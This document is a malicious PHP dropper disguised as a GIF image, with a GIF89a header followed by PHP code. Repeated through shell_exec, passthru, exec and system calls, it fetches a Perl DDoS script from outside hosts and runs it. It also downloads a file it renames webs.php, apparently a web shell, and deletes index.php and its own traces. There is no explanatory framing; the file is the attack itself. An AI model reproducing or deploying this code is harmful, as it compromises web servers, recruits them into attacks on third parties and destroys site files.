GIF89a?????���???!�????,???????D?;?<?php
shell_exec("wget http://dorsila.ru/wp-admin/js/ddos.txt;perl ddos.txt;wget http://www.eidv.com.ar/wp-content/uploads/2010/injektor.txt;mv injektor.txt webs.php");
shell_exec('curl -O http://dorsila.ru/wp-admin/js/ddos.txt;perl ddos.txt;curl -O http://www.eidv.com.ar/wp-content/uploads/2010/injektor.txt;mv injektor.txt webs.php');
shell_exec('lwp-download http://dorsila.ru/wp-admin/js/ddos.txt;perl ddos.txt;lwp-download http://www.eidv.com.ar/wp-content/uploads/2010/injektor.txt;mv injektor.txt webs.php');
shell_exec('rm -rf index.php');
shell_exec('rm -rf ddos.txt');
shell_exec('rm -rf webs.php2');
shell_exec('rm -rf webs.php.1');
passthru("wget http://dorsila.ru/wp-admin/js/ddos.txt;perl ddos.txt;wget http://www.eidv.com.ar/wp-content/uploads/2010/injektor.txt;mv injektor.txt webs.php");
passthru('curl -O http://dorsila.ru/wp-admin/js/ddos.txt;perl ddos.txt;curl -O http://www.eidv.com.ar/wp-content/uploads/2010/injektor.txt;mv injektor.txt webs.php');
passthru('lwp-download http://dorsila.ru/wp-admin/js/ddos.txt;perl ddos.txt;lwp-download http://www.eidv.com.ar/wp-content/uploads/2010/injektor.txt;mv injektor.txt webs.php');
passthru('rm -rf ddal.txt');
passthru('rm -rf ddos.txt');
passthru('rm -rf ddos.txt*');
passthru('rm -rf ddos.txt.*');
exec("wget http://rybalka-ekb.ru/wp-content/plugins/akismet/ddos.txt;perl ddos.txt;wget http://www.eidv.com.ar/wp-content/uploads/2010/injektor.txt;mv injektor.txt webs.php");
exec('curl -O http://dorsila.ru/wp-admin/js/ddos.txt;perl ddos.txt;curl -O http://www.eidv.com.ar/wp-content/uploads/2010/injektor.txt;mv injektor.txt webs.php');
exec('lwp-download http://dorsila.ru/wp-admin/js/ddos.txt;perl ddos.txt;lwp-download http://www.eidv.com.ar/wp-content/uploads/2010/injektor.txt;mv injektor.txt webs.php');
exec('rm -rf ddal.txt');
exec('rm -rf ddos.txt');
exec('rm -rf ddos.txt*');
exec('rm -rf ddos.txt.*');
system("wget http://dorsila.ru/wp-admin/js/ddos.txt;perl ddos.txt;wget http://www.eidv.com.ar/wp-content/uploads/2010/injektor.txt;mv injektor.txt webs.php");
system('curl -O http://dorsila.ru/wp-admin/js/ddos.txt;perl ddos.txt;curl -O http://www.eidv.com.ar/wp-content/uploads/2010/injektor.txt;mv injektor.txt webs.php');
system('lwp-download http://dorsila.ru/wp-admin/js/ddos.txt;perl ddos.txt;lwp-download http://www.eidv.com.ar/wp-content/uploads/2010/injektor.txt;mv injektor.txt webs.php');
system('rm -rf ddos.txt;rm -rf webs.php.1;rm -rf webs.php.2;rm -rf index.php');
?>